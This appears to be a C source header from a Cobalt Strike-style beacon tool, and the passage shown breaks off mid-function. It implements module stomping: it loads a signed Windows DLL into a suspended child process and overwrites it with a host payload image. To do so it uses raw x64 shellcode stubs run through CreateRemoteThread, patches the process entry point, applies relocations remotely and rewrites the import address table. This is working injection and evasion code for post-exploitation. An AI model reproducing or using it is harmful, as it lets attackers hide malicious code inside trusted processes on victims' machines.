#pragma once
/*
 * Module stomping host load:
 *   LoadLibraryEx(victim, DONT_RESOLVE_DLL_REFERENCES) in the child, then
 *   overwrite that image with PowerPickForkHost (sections/relocs/imports).
 *
 * PE work uses remote Read/Write + remote LoadLibrary/GetProcAddress only —
 * no full SizeOfImage buffer in the agent (that previously AVed the beacon).
 */

#include <winnt.h>

#ifndef DONT_RESOLVE_DLL_REFERENCES
#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
#endif
#ifndef LOAD_LIBRARY_SEARCH_SYSTEM32
#define LOAD_LIBRARY_SEARCH_SYSTEM32 0x00000800
#endif

/*
 * Victim must be large enough for the host image and must NOT sit in the
 * dependency chain of host/CLR imports. Stomping crypt32/winhttp/urlmon
 * breaks later LoadLibrary(ole32/…) which still bind to that module.
 */
static const char* PpfStompVictims[] = {
    "C:\\Windows\\System32\\xpsservices.dll",
    "C:\\Windows\\System32\\mshtml.dll",
    "C:\\Windows\\System32\\d3d11.dll",
    "C:\\Windows\\System32\\twinapi.appcore.dll",
    "C:\\Windows\\System32\\Windows.UI.dll",
    NULL
};

/*
 * Short names + LOAD_LIBRARY_SEARCH_SYSTEM32 after warm-up.
 * Load oleaut32 (pulls ole32/combase) — avoid a separate ole32 preload that
 * was leaving the third LoadLibraryEx(OLEAUT32) failing.
 */
static const char* PpfStompHostDeps[] = {
    "msvcrt.dll",
    "oleaut32.dll",
    NULL
};

static BOOL PpfStompRemoteWrite(
    HANDLE hProcess,
    LPVOID remote,
    const void* local,
    SIZE_T size)
{
    SIZE_T written = 0;
    return KERNEL32$WriteProcessMemory(
        hProcess, remote, local, size, &written) && written == size;
}

static BOOL PpfStompRemoteRead(
    HANDLE hProcess,
    LPCVOID remote,
    void* local,
    SIZE_T size)
{
    SIZE_T readn = 0;
    return KERNEL32$ReadProcessMemory(
        hProcess, remote, local, size, &readn) && readn == size;
}

static LPVOID PpfStompRemoteAlloc(HANDLE hProcess, SIZE_T size, DWORD protect)
{
    return KERNEL32$VirtualAllocEx(
        hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
}

static void PpfStompFail(const char* step)
{
    BeaconPrintf(
        CALLBACK_ERROR,
        "[!] stomp: %s failed (err=%lu)",
        step,
        KERNEL32$GetLastError());
}

/*
 * PE images are multiple regions — VirtualProtectEx(base, SizeOfImage) fails.
 * Walk with VirtualQueryEx and protect each committed region in the range.
 */
static BOOL PpfStompProtectRange(
    HANDLE hProcess,
    LPVOID addr,
    SIZE_T size,
    DWORD protect)
{
    BYTE* p = (BYTE*)addr;
    BYTE* end = p + size;

    while (p < end) {
        MEMORY_BASIC_INFORMATION mbi;
        DWORD oldProt = 0;
        SIZE_T chunk;
        BYTE* regionEnd;

        if (KERNEL32$VirtualQueryEx(hProcess, p, &mbi, sizeof(mbi)) == 0) {
            return FALSE;
        }
        if (mbi.State != MEM_COMMIT) {
            return FALSE;
        }
        regionEnd = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        chunk = (SIZE_T)(regionEnd - p);
        if (p + chunk > end) {
            chunk = (SIZE_T)(end - p);
        }
        if (!KERNEL32$VirtualProtectEx(
                hProcess, p, chunk, protect, &oldProt)) {
            return FALSE;
        }
        p += chunk;
    }
    return TRUE;
}

/* result = fn(rcx, rdx); store at out. */
static BOOL PpfStompRemoteCall2(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR arg0,
    ULONG_PTR arg1,
    ULONG_PTR* outResult,
    DWORD timeoutMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteOut = NULL;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;
    ULONG_PTR result = 0;
    DWORD wait;

    if (outResult) {
        *outResult = 0;
    }

    remoteOut = PpfStompRemoteAlloc(hProcess, sizeof(ULONG_PTR), PAGE_READWRITE);
    remoteSc = PpfStompRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteOut || !remoteSc) {
        goto done;
    }

    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &arg0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &arg1, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &remoteOut, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0x89; stub[n++] = 0x01;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }
    wait = KERNEL32$WaitForSingleObject(hThread, timeoutMs);
    if (wait != WAIT_OBJECT_0) {
        goto done;
    }
    if (!PpfStompRemoteRead(hProcess, remoteOut, &result, sizeof(result))) {
        goto done;
    }
    if (outResult) {
        *outResult = result;
    }
    ok = TRUE;

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    if (remoteOut) {
        KERNEL32$VirtualFreeEx(hProcess, remoteOut, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompRemoteLoadLibraryExA(
    HANDLE hProcess,
    const char* path,
    DWORD flags,
    ULONG_PTR* outBase)
{
    SIZE_T pathLen;
    LPVOID remotePath = NULL;
    ULONG_PTR pLoadLibraryExA;
    BOOL ok = FALSE;

    *outBase = 0;
    pLoadLibraryExA = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "LoadLibraryExA");
    if (!pLoadLibraryExA) {
        return FALSE;
    }

    pathLen = MSVCRT$strlen(path) + 1;
    remotePath = PpfStompRemoteAlloc(hProcess, pathLen, PAGE_READWRITE);
    if (!remotePath || !PpfStompRemoteWrite(hProcess, remotePath, path, pathLen)) {
        goto done;
    }

    /*
     * LoadLibraryExA(lpLibFileName, hFile, dwFlags)
     * rcx=path, rdx=NULL, r8=flags — need a 3-arg stub.
     */
    {
        BYTE stub[96];
        SIZE_T n = 0;
        LPVOID remoteOut = NULL;
        LPVOID remoteSc = NULL;
        HANDLE hThread = NULL;
        ULONG_PTR result = 0;
        DWORD wait;
        ULONG_PTR zero = 0;
        ULONG_PTR fl = (ULONG_PTR)flags;

        remoteOut = PpfStompRemoteAlloc(hProcess, sizeof(ULONG_PTR), PAGE_READWRITE);
        remoteSc = PpfStompRemoteAlloc(hProcess, 96, PAGE_EXECUTE_READWRITE);
        if (!remoteOut || !remoteSc) {
            goto done3;
        }

        stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
        stub[n++] = 0x48; stub[n++] = 0xB9;
        MSVCRT$memcpy(stub + n, &remotePath, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0xBA;
        MSVCRT$memcpy(stub + n, &zero, 8); n += 8;
        stub[n++] = 0x49; stub[n++] = 0xB8;
        MSVCRT$memcpy(stub + n, &fl, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0xB8;
        MSVCRT$memcpy(stub + n, &pLoadLibraryExA, 8); n += 8;
        stub[n++] = 0xFF; stub[n++] = 0xD0;
        stub[n++] = 0x48; stub[n++] = 0xB9;
        MSVCRT$memcpy(stub + n, &remoteOut, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0x89; stub[n++] = 0x01;
        stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
        stub[n++] = 0xC3;

        if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
            goto done3;
        }
        hThread = KERNEL32$CreateRemoteThread(
            hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
        if (!hThread) {
            goto done3;
        }
        wait = KERNEL32$WaitForSingleObject(hThread, 15000);
        if (wait == WAIT_OBJECT_0 &&
            PpfStompRemoteRead(hProcess, remoteOut, &result, sizeof(result)) &&
            result != 0) {
            *outBase = result;
            ok = TRUE;
        }
        KERNEL32$CloseHandle(hThread);
    done3:
        if (remoteSc) {
            KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
        }
        if (remoteOut) {
            KERNEL32$VirtualFreeEx(hProcess, remoteOut, 0, MEM_RELEASE);
        }
    }

done:
    if (remotePath) {
        KERNEL32$VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompRemoteGetProc(
    HANDLE hProcess,
    ULONG_PTR moduleBase,
    const char* name,
    ULONG_PTR* outFn)
{
    SIZE_T nameLen;
    LPVOID remoteName = NULL;
    ULONG_PTR pGetProcAddress;
    BOOL ok = FALSE;

    *outFn = 0;
    pGetProcAddress = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "GetProcAddress");
    if (!pGetProcAddress) {
        return FALSE;
    }

    nameLen = MSVCRT$strlen(name) + 1;
    remoteName = PpfStompRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
    if (!remoteName || !PpfStompRemoteWrite(hProcess, remoteName, name, nameLen)) {
        goto done;
    }
    if (!PpfStompRemoteCall2(
            hProcess, pGetProcAddress, moduleBase, (ULONG_PTR)remoteName, outFn,
            15000) ||
        *outFn == 0) {
        goto done;
    }
    ok = TRUE;

done:
    if (remoteName) {
        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    }
    return ok;
}

static DWORD PpfStompRvaToOffset(const BYTE* pe, DWORD peLen, DWORD rva)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    IMAGE_SECTION_HEADER* sec;
    WORD i;

    if (!pe || peLen < 0x200) {
        return 0;
    }
    dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > peLen) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }
    if (rva < nt->OptionalHeader.SizeOfHeaders) {
        return rva;
    }
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD raw = sec[i].PointerToRawData;
        DWORD rsz = sec[i].SizeOfRawData;
        if (rva >= va && rva < va + (vsz ? vsz : rsz)) {
            DWORD off = raw + (rva - va);
            return (off < peLen) ? off : 0;
        }
    }
    return 0;
}

static ULONG_PTR PpfStompGetExportRva(
    const BYTE* pe,
    DWORD peLen,
    const char* exportName)
{
    IMAGE_NT_HEADERS64* nt;
    IMAGE_DATA_DIRECTORY* dir;
    IMAGE_EXPORT_DIRECTORY* exp;
    DWORD* names;
    WORD* ords;
    DWORD* funcs;
    DWORD i;
    DWORD off;

    if (!pe || peLen < 0x200) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) {
        return 0;
    }
    off = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!off) {
        return 0;
    }
    exp = (IMAGE_EXPORT_DIRECTORY*)(pe + off);
    names = (DWORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfNames));
    ords = (WORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfNameOrdinals));
    funcs = (DWORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfFunctions));
    for (i = 0; i < exp->NumberOfNames; i++) {
        DWORD nameOff = PpfStompRvaToOffset(pe, peLen, names[i]);
        if (!nameOff) {
            continue;
        }
        if (MSVCRT$strncmp((const char*)(pe + nameOff), exportName, 64) == 0) {
            return (ULONG_PTR)funcs[ords[i]];
        }
    }
    return 0;
}

static BOOL PpfStompRemoteCall4(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR a0,
    ULONG_PTR a1,
    ULONG_PTR a2,
    ULONG_PTR a3,
    DWORD waitMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;

    remoteSc = PpfStompRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) {
        return FALSE;
    }

    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &a1, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &a2, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a3, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }
    if (waitMs == 0) {
        ok = TRUE;
        goto done;
    }
    ok = (KERNEL32$WaitForSingleObject(hThread, waitMs) == WAIT_OBJECT_0);

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (waitMs != 0 && remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompApplyRelocs(
    HANDLE hProcess,
    ULONG_PTR remoteBase,
    ULONG_PTR preferred,
    const BYTE* pe,
    DWORD peLen,
    DWORD sizeOfImage)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD off;
    DWORD processed = 0;
    ULONG_PTR delta;

    if (!dir->VirtualAddress || !dir->Size) {
        return TRUE;
    }
    delta = remoteBase - preferred;
    if (delta == 0) {
        return TRUE;
    }

    off = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!off) {
        return FALSE;
    }

    while (processed < dir->Size) {
        IMAGE_BASE_RELOCATION* block =
            (IMAGE_BASE_RELOCATION*)(pe + off + processed);
        DWORD count;
        WORD* entries;
        DWORD i;

        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
            break;
        }
        count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        entries = (WORD*)((BYTE*)block + sizeof(IMAGE_BASE_RELOCATION));

        for (i = 0; i < count; i++) {
            WORD type = entries[i] >> 12;
            WORD roff = entries[i] & 0xFFF;
            DWORD rva = block->VirtualAddress + roff;
            ULONG_PTR patchAddr;
            ULONG_PTR value;

            if (type == IMAGE_REL_BASED_ABSOLUTE) {
                continue;
            }
            if (type != IMAGE_REL_BASED_DIR64) {
                continue;
            }
            if (rva + sizeof(ULONG_PTR) > sizeOfImage) {
                return FALSE;
            }
            patchAddr = remoteBase + rva;
            if (!PpfStompRemoteRead(
                    hProcess, (LPCVOID)patchAddr, &value, sizeof(value))) {
                return FALSE;
            }
            value += delta;
            if (!PpfStompRemoteWrite(
                    hProcess, (LPVOID)patchAddr, &value, sizeof(value))) {
                return FALSE;
            }
        }
        processed += block->SizeOfBlock;
    }
    return TRUE;
}

static BOOL PpfStompRemoteLoadLibraryA(
    HANDLE hProcess,
    const char* path,
    ULONG_PTR* outBase)
{
    SIZE_T pathLen;
    LPVOID remotePath = NULL;
    ULONG_PTR pLoadLibraryA;
    BOOL ok = FALSE;

    *outBase = 0;
    pLoadLibraryA = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA");
    if (!pLoadLibraryA) {
        return FALSE;
    }

    pathLen = MSVCRT$strlen(path) + 1;
    remotePath = PpfStompRemoteAlloc(hProcess, pathLen, PAGE_READWRITE);
    if (!remotePath || !PpfStompRemoteWrite(hProcess, remotePath, path, pathLen)) {
        goto done;
    }
    if (!PpfStompRemoteCall2(
            hProcess,
            pLoadLibraryA,
            (ULONG_PTR)remotePath,
            0,
            outBase,
            15000) ||
        *outBase == 0) {
        goto done;
    }
    ok = TRUE;

done:
    if (remotePath) {
        KERNEL32$VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    }
    return ok;
}

/*
 * Suspended processes have not run the EXE entry point; LoadLibraryA (DllMain)
 * often returns NULL there. Point EP at Sleep(INFINITE) so the primary thread
 * parks (not a jmp-$ spin), ResumeThread for loader init, then we can
 * LoadLibraryEx real deps.
 */
static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
{
    CONTEXT ctx;
    ULONG_PTR peb = 0;
    ULONG_PTR imageBase = 0;
    BYTE hdr[0x400];
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    ULONG_PTR entry;
    ULONG_PTR pSleep;
    BYTE stub[32];
    SIZE_T n = 0;
    LPVOID remoteStub = NULL;
    DWORD oldProt = 0;
    BYTE jmp[14];
    ULONG_PTR stubAddr;
    DWORD infinite = 0xFFFFFFFFu;

    if (!hProcess || !hThread) {
        return FALSE;
    }

    pSleep = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "Sleep");
    if (!pSleep) {
        PpfStompFail("Sleep");
        return FALSE;
    }

    MSVCRT$memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        PpfStompFail("GetThreadContext");
        return FALSE;
    }

    /* x64 CREATE_SUSPENDED: Rdx = PEB */
    peb = (ULONG_PTR)ctx.Rdx;
    if (!peb ||
        !PpfStompRemoteRead(
            hProcess, (LPCVOID)(peb + 0x10), &imageBase, sizeof(imageBase)) ||
        !imageBase) {
        PpfStompFail("PEB ImageBase");
        return FALSE;
    }

    if (!PpfStompRemoteRead(hProcess, (LPCVOID)imageBase, hdr, sizeof(hdr))) {
        PpfStompFail("read exe hdr");
        return FALSE;
    }
    dos = (IMAGE_DOS_HEADER*)hdr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) {
        PpfStompFail("exe pe");
        return FALSE;
    }
    nt = (IMAGE_NT_HEADERS64*)(hdr + dos->e_lfanew);
    entry = imageBase + nt->OptionalHeader.AddressOfEntryPoint;

    /*
     * remoteStub:
     *   sub rsp, 28h
     *   mov ecx, INFINITE
     *   mov rax, Sleep
     *   call rax
     *   jmp $          ; only if Sleep returns
     */
    remoteStub = PpfStompRemoteAlloc(hProcess, 64, PAGE_EXECUTE_READWRITE);
    if (!remoteStub) {
        PpfStompFail("alloc sleep stub");
        return FALSE;
    }
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &infinite, 4); n += 4;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &pSleep, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0xEB; stub[n++] = 0xFE;
    if (!PpfStompRemoteWrite(hProcess, remoteStub, stub, n)) {
        PpfStompFail("write sleep stub");
        return FALSE;
    }

    /* EP -> jmp [rip+0]; dq remoteStub  (14-byte absolute jump) */
    stubAddr = (ULONG_PTR)remoteStub;
    jmp[0] = 0xFF;
    jmp[1] = 0x25;
    jmp[2] = 0x00;
    jmp[3] = 0x00;
    jmp[4] = 0x00;
    jmp[5] = 0x00;
    MSVCRT$memcpy(jmp + 6, &stubAddr, 8);
    if (!KERNEL32$VirtualProtectEx(
            hProcess, (LPVOID)entry, sizeof(jmp), PAGE_EXECUTE_READWRITE, &oldProt)) {
        PpfStompFail("protect EP");
        return FALSE;
    }
    if (!PpfStompRemoteWrite(hProcess, (LPVOID)entry, jmp, sizeof(jmp))) {
        PpfStompFail("patch EP");
        return FALSE;
    }
    if (KERNEL32$ResumeThread(hThread) == (DWORD)-1) {
        PpfStompFail("ResumeThread");
        return FALSE;
    }
    /* Let ntdll finish process/thread init; primary then blocks in Sleep. */
    KERNEL32$Sleep(300);
    return TRUE;
}

static BOOL PpfStompRemoteGetModuleHandleA(
    HANDLE hProcess,
    const char* name,
    ULONG_PTR* outBase)
{
    SIZE_T nameLen;
    LPVOID remoteName = NULL;
    ULONG_PTR pGetModuleHandleA;
    BOOL ok = FALSE;

    *outBase = 0;
    pGetModuleHandleA = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "GetModuleHandleA");
    if (!pGetModuleHandleA) {
        return FALSE;
    }

    nameLen = MSVCRT$strlen(name) + 1;
    remoteName = PpfStompRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
    if (!remoteName || !PpfStompRemoteWrite(hProcess, remoteName, name, nameLen)) {
        goto done;
    }
    if (!PpfStompRemoteCall2(
            hProcess,
            pGetModuleHandleA,
            (ULONG_PTR)remoteName,
            0,
            outBase,
            15000)) {
        goto done;
    }
    ok = (*outBase != 0);

done:
    if (remoteName) {
        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    }
    return ok;
}

/* Map host deps in the child before the victim is stomped. */
static BOOL PpfStompPreloadDeps(HANDLE hProcess)
{
    int i;
    for (i = 0; PpfStompHostDeps[i] != NULL; i++) {
        ULONG_PTR base = 0;
        const char* dep = PpfStompHostDeps[i];

        if (PpfStompRemoteGetModuleHandleA(hProcess, dep, &base)) {
            continue;
        }

        /* Prefer System32 search; full DllMain init (process must be warmed). */
        if (!PpfStompRemoteLoadLibraryExA(
                hProcess, dep, LOAD_LIBRARY_SEARCH_SYSTEM32, &base)) {
            /* Retry with plain flags=0 (some builds ignore SEARCH_*). */
            if (!PpfStompRemoteLoadLibraryExA(hProcess, dep, 0, &base)) {
                BeaconPrintf(
                    CALLBACK_ERROR,
                    "[!] stomp: preload %s failed",
                    dep);
                return FALSE;
            }
        }
    }

    /* Host also imports ole32 — ensure it is mapped (usually via oleaut32). */
    {
        ULONG_PTR ole = 0;
        if (!PpfStompRemoteGetModuleHandleA(hProcess, "ole32.dll", &ole)) {
            if (!PpfStompRemoteLoadLibraryExA(
                    hProcess, "ole32.dll", LOAD_LIBRARY_SEARCH_SYSTEM32, &ole) &&
                !PpfStompRemoteLoadLibraryExA(hProcess, "ole32.dll", 0, &ole)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] stomp: preload ole32.dll failed");
                return FALSE;
            }
        }
    }
    return TRUE;
}

/*
 * Fill IAT with agent-side GetProcAddress addresses. System DLL bases match
 * across processes; deps were already LoadLibraryEx'd into the child during
 * preload. No remote LoadLibrary here (short-name stubs were failing).
 */
static BOOL PpfStompResolveImports(
    HANDLE hProcess,
    ULONG_PTR remoteBase,
    const BYTE* pe,
    DWORD peLen)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    DWORD descOff;
    DWORD descIndex;

    if (!dir->VirtualAddress) {
        return TRUE;
    }
    descOff = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!descOff) {
        return FALSE;
    }

    for (descIndex = 0;; descIndex++) {
        IMAGE_IMPORT_DESCRIPTOR imp;
        DWORD nameOff;
        char dllName[128];
        HMODULE localMod = NULL;
        DWORD oftRva;
        DWORD ftRva;
        DWORD thunkIndex;

        MSVCRT$memcpy(
            &imp,
            pe + descOff + descIndex * sizeof(IMAGE_IMPORT_DESCRIPTOR),
            sizeof(imp));
        if (!imp.Name) {
            break;
        }

        nameOff = PpfStompRvaToOffset(pe, peLen, imp.Name);
        if (!nameOff) {
            return FALSE;
        }
        MSVCRT$memset(dllName, 0, sizeof(dllName));
        {
            DWORD k;
            for (k = 0; k < sizeof(dllName) - 1; k++) {
                if (nameOff + k >= peLen) {
                    break;
                }
                dllName[k] = (char)pe[nameOff + k];
                if (dllName[k] == '\0') {
                    break;
                }
            }
        }

        localMod = KERNEL32$GetModuleHandleA(dllName);
        if (!localMod) {
            localMod = KERNEL32$LoadLibraryA(dllName);
        }
        if (!localMod) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[!] stomp: local LoadLibrary(%s) failed (err=%lu)",
                dllName,
                KERNEL32$GetLastError());
            return FALSE;
        }

        oftRva = imp.OriginalFirstThunk ? imp.OriginalFirstThunk : imp.FirstThunk;
        ftRva = imp.FirstThunk;

        for (thunkIndex = 0;; thunkIndex++) {
            DWORD entryOff;
            ULONG_PTR entry;
            ULONG_PTR fn = 0;
            ULONG_PTR iatAddr;
            FARPROC localFn = NULL;

            entryOff = PpfStompRvaToOffset(
                pe, peLen, oftRva + thunkIndex * sizeof(ULONG_PTR));
            if (!entryOff) {
                return FALSE;
            }
            entry = *(ULONG_PTR*)(pe + entryOff);
            if (entry == 0) {
                break;
            }

            if (IMAGE_SNAP_BY_ORDINAL64(entry)) {
                localFn = KERNEL32$GetProcAddress(
                    localMod, (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL64(entry));
            } else {
                DWORD ibnOff = PpfStompRvaToOffset(pe, peLen, (DWORD)entry);
                IMAGE_IMPORT_BY_NAME* ibn;
                if (!ibnOff || ibnOff + 2 >= peLen) {
                    return FALSE;
                }
                ibn = (IMAGE_IMPORT_BY_NAME*)(pe + ibnOff);
                localFn = KERNEL32$GetProcAddress(localMod, (LPCSTR)ibn->Name);
                if (!localFn) {
                    BeaconPrintf(
                        CALLBACK_ERROR,
                        "[!] stomp: GetProcAddress(%s!%s) failed",
                        dllName,
                        (const char*)ibn->Name);
                    return FALSE;
                }
            }
            if (!localFn) {
                BeaconPrintf(
                    CALLBACK_ERROR,
                    "[!] stomp: GetProcAddress(%s#ord) failed",
                    dllName);
                return FALSE;
            }
            fn = (ULONG_PTR)localFn;

            iatAddr = remoteBase + ftRva + thunkIndex * sizeof(ULONG_PTR);
            if (!PpfStompRemoteWrite(hProcess, (LPVOID)iatAddr, &fn, sizeof(fn))) {
                PpfStompFail("IAT write");
                return FALSE;
            }
        }
    }
    return TRUE;
}

static BOOL PpfStompHostDll(
    HANDLE hProcess,
    HANDLE hThread,
    const char* hostDll,
    int hostDllLen,
    const char* mapName)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    DWORD sizeOfImage;
    DWORD sizeOfHeaders;
    ULONG_PTR remoteBase = 0;
    ULONG_PTR exportRva;
    ULONG_PTR entry;
    LPVOID remoteMapName = NULL;
    SIZE_T mapNameLen;
    WORD secIndex;
    int v;

    if (!hProcess || !hThread || !hostDll || hostDllLen < 0x200 || !mapName) {
        PpfStompFail("args");
        return FALSE;
    }

    if (!PpfStompWarmProcess(hProcess, hThread)) {
        return FALSE;
    }

    dos = (IMAGE_DOS_HEADER*)hostDll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        PpfStompFail("dos");
        return FALSE;
    }
    nt = (IMAGE_NT_HEADERS64*)(hostDll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        PpfStompFail("nt");
        return FALSE;
    }

    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    if (sizeOfHeaders > (DWORD)hostDllLen || sizeOfImage < sizeOfHeaders) {
        PpfStompFail("sizes");
        return FALSE;
    }

    /* Map real deps first — before the victim image is destroyed. */
    if (!PpfStompPreloadDeps(hProcess)) {
        return FALSE;
    }

    /* Load a signed victim image (no DllMain / no victim imports). */
    for (v = 0; PpfStompVictims[v] != NULL; v++) {
        if (PpfStompRemoteLoadLibraryExA(
                hProcess,
                PpfStompVictims[v],
                DONT_RESOLVE_DLL_REFERENCES,
                &remoteBase)) {
            break;
        }
        remoteBase = 0;
    }
    if (!remoteBase) {
        PpfStompFail("LoadLibraryEx victim");
        return FALSE;
    }

    /* Ensure victim mapping is large enough (read remote SizeOfImage). */
    {
